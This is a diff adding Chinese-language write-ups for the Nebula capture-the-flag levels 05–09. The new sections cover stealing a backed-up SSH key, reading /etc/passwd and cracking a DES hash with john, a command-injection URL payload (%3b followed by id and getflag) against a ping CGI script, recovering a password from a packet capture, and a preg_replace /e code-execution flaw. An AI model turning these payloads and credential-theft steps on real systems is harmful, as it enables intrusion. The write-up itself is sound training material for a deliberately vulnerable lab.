@@ -128,7 +128,113 @@ done
 
 ## level04 -- 绕过权限获得token
 
-## level07
+## level05 -- 窃取机密文件
+以level05的身份进入到flag05账户的家目录，发现了几个隐藏目录 .ssh 和 .backup。对于.ssh发现没有权限进入，
+而.backup目录则有权限，进入之后发现一个.tgz的压缩文件，
+说明：在linux中`.tgz`格式的压缩文件是`.tar.gz`的缩写。我们在解压.tgz文件时可直接使用tar命令来操作。
+可以自己的工作机上解压，也可以更方便的在/tmp目录下解压。
+```
+$ tar zxvf xxx.tgz 
+```
+或者
+```
+$ tart zxvf xxx.tar.gz
+```
+不然如果用gunizp解压之后，还会得到一个.tar文件。
+解压成功之后发现其内容是.ssh目录，应该是备份的公钥和私钥。如此以来，我们就可以以flag05的身份登录系统。
+把.ssh复制到level05的家目录中(ssh验证时用的私钥和公钥需放在家目录下的.ssh目录中)。然后ssh登录即可。
+```
+$ ssh flag05@localhost
+```
+
+## level06
+根据题目描述，flag06这个帐号的认证凭据是按照传统UNIX的方法存储的，意味着密文是存储在/etc/passwd中的，而不是/etc/shadow
+直接读取/etc/passwd 里flag06加密后的密码
+```
+$ level06@nebula:~$ cat /etc/passwd |grep flag06
+flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh
+```
+然后将这条内容保存到一个文件中，比如叫password
+```
+$ echo "flag06:ueqwOCnSGdsuM:993:993::/home/flag06:/bin/sh" > password
+```
+然后用john来破解即可。
+```
+$ /usr/sbin/john password
+Using default input encoding: UTF-8
+Loaded 1 password hash (descrypt, traditional crypt(3) [DES 128/128 AVX-16])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hello            (flag06)
+1g 0:00:00:00 DONE 2/3 (2017-03-23 14:48) 14.28g/s 10714p/s 10714c/s 10714C/s 123456..marley
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+得到密码为`hello`
+然后用这个密码登录flag06帐号，然后getflag即可。
+
+## level07 -- 任意命令执行
+
+在/home/flag07这个目录下，有一个index.cgi和thttpd.conf
+通过搜索thttpd的资料，知道它是一个轻量级web server。
+其用法为:
+```
+$ thttpd -C thttpd.conf
+```
+使用thttpd命令然后指定其配置文件thttpd.conf即可。
+需要手动开启这个服务。
+由于开始thttpd服务并没有跑起来，于是需要先用nebula帐号登录然后
+```
+sudo -s
+su flag07
+/usr/sbin/thttpd -C /home/flag07/thttpd.conf
+```
+这样先把自己变成root，然后变成flag07，然后以flag07用户让服务跑起来。
+通过`thttpd -C thttpd.conf`开启之后，发现thttpd已经在7007端口监听了。
+我们需要用http客户端(比如curl)访问它的`index.cgi`文件。
+这关考验的是分析这个index.cgi。
+这段代码的功能是通过调用外部的ping命令去ping指定的ip地址，该ip通过参数指定
+`$host = $_[0]`。最后程序会把ping的结果返回到客户端。
+于是我们可以在自己的工作机上用curl -i 来得到http通信的详细结果。
+注意index.cgi后接的参数Host为大写。在index.cgi文件的最后一个`param("Host")决定了这个参数。`
+```
+➜  CTF/Nebula master ✓ curl -i "http://192.168.170.194:7007/index.cgi?Host=127.0.0.1"                                             [15:05:48]
+HTTP/1.0 200 OK
+Content-type: text/html
+
+<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.036 ms
+64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms
+64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.032 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1998ms
+rtt min/avg/max/mdev = 0.022/0.030/0.036/0.005 ms
+</pre></body></html>%
+```
+由于想到index.cgi文件中的**@output = `ping -c 3 $host 2>$1`**这句，这句出现了任意命令执行漏洞。
+于是构造url
+`http://192.168.170.194:7007/index.cgi?Host=127.0.0.1;id`
+不管通过curl还是通过浏览器访问，都不能执行`id`命令。最后想到的url编码，于是找到`;`的url编码值`%3b`，然后构造以下url
+`http://192.168.170.194:7007/index.cgi?Host=127.0.0.1%3bid`，成功执行`id`命令。
+```
+➜  CTF/Nebula/level07 master ✓ curl -i "http://192.168.170.194:7007/index.cgi?Host=127.0.0.1%3bid"                                [15:29:32]
+0mid"HTTP/1.0 200 OK
+Content-type: text/html
+
+<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.019 ms
+64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.057 ms
+64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.028 ms
+
+--- 127.0.0.1 ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+rtt min/avg/max/mdev = 0.019/0.034/0.057/0.017 ms
+uid=1008(level07) gid=1008(level07) groups=1008(level07)
+</pre></body></html>%
+```
+于是可以构造`http://192.168.170.194:7007/index.cgi?Host=127.0.0.1%3bgetflag`成功执行`getflag`命令。
+
+## level08
 参考:
 http://blog.yyx.me/posts/exploit-exercises-nebula-level-05-09.html
 在`/home/flag07`目录下找到一个`capture.pcap`，所以拖出来到宿主机上用wireshark分析。跟踪TCP流，发现
@@ -161,5 +267,20 @@ http://blog.yyx.me/posts/exploit-exercises-nebula-level-05-09.html
 ![](img/屏幕快照 2016-11-12 下午7.40.33.png)
 ![](img/屏幕快照 2016-11-12 下午7.50.11.png)
 ![](img/屏幕快照 2016-11-12 下午7.50.16.png)
-竟然是7F，查ASCII码表发现7F是Backspace（退格），0D是CR（回车），所以就按照这个顺序重新比划了下，
-得到密码是backd00Rmate
+竟然是7F，查ASCII码表发现7F是Backspace（退格），0D是CR（回车），
+于是上面的意思就是，用户输入到backdoor的时候，删除了三个字符，然后输入00Rm8后，又删除了一个字符，最后输入ate，然后按下回车键。
+所以最终结果拼凑起来就是： `backd00Rmate`
+然后以这个密码登录flag08帐号即可得到flag08的shell，然后getflag。
+
+## level09
+在/home/flag09目录下发现两个文件flag09 和flag09.php
+这段代码通过正则表达式匹配[email xxx@yyy]，将`.` 替换成 `dot`，将`@`替换成`AT`。
+在/tmp目录下建立一个文本文件cqq_email，内容为`[email 77caikiki@protonmail.com]`
+执行`./flag09 /tmp/cqq_email`之后，得到输出
+`77caikiki AT protonmail dot com`
+但是我们注意这段代码:
+```php
+$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
+```
+`preg_replace`第一个参数后使用了`/e`模式。如果启用这种模式，那么preg_replace的第二个参数将会被作为代码执行。之前ThinkPHP也出现了这种漏洞。
+
